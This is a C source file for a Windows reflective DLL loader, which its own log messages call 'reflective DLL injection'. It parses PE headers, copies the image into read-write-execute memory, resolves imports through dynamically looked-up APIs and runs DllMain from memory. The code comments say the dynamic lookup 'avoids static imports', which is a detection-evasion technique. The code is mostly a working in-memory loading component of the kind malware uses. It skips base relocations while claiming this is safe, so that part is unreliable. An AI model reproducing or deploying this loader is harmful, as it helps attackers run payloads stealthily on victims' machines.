#include <windows.h>
#include <stdio.h>
#include "reflective_loader.h"

// Dynamically resolve Windows API (avoids static imports)
#define GETAPI(lib, func) GetProcAddress(LoadLibraryA(lib), func)

// Entry point for Reflective Loader
int reflective_load(LPVOID dll_buffer) {
    printf("[Reflective Loader] Starting reflective DLL injection...\n");

    // Get the DOS Header
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_buffer;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Invalid DOS Header.\n");
        return 0;
    }

    // Get the NT Headers
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)dll_buffer + dos_header->e_lfanew);
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid NT Headers.\n");
        return 0;
    }

    SIZE_T image_size = nt_headers->OptionalHeader.SizeOfImage;
    LPVOID allocated_memory = VirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocated_memory) {
        printf("[!] Failed to allocate memory.\n");
        return 0;
    }

    // Copy headers
    memcpy(allocated_memory, dll_buffer, nt_headers->OptionalHeader.SizeOfHeaders);

    // Copy each section
    PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((DWORD_PTR)&nt_headers->OptionalHeader + nt_headers->FileHeader.SizeOfOptionalHeader);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        LPVOID dest = (LPVOID)((DWORD_PTR)allocated_memory + section[i].VirtualAddress);
        LPVOID src = (LPVOID)((DWORD_PTR)dll_buffer + section[i].PointerToRawData);
        memcpy(dest, src, section[i].SizeOfRawData);
    }

    // Apply base relocations (optional — basic version skips this safely for many DLLs)
    // More advanced relocation logic could be added here.

    // Resolve Imports
    PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)allocated_memory +
        nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (import_desc->Name) {
        char* dll_name = (char*)((DWORD_PTR)allocated_memory + import_desc->Name);
        HMODULE handle = LoadLibraryA(dll_name);

        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)allocated_memory + import_desc->FirstThunk);

        while (thunk->u1.AddressOfData) {
            PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)allocated_memory + thunk->u1.AddressOfData);
            FARPROC func_address = GETAPI(dll_name, (LPCSTR)import->Name);
            thunk->u1.Function = (ULONGLONG)func_address;
            thunk++;
        }
        import_desc++;
    }

    // Call DLL entry point (DllMain)
    DLLMAIN entry = (DLLMAIN)((DWORD_PTR)allocated_memory + nt_headers->OptionalHeader.AddressOfEntryPoint);
    printf("[Reflective Loader] Calling DllMain() in-memory...\n");
    entry((HINSTANCE)allocated_memory, DLL_PROCESS_ATTACH, NULL);

    printf("[Reflective Loader] Reflective injection complete.\n");
    return 1;
}
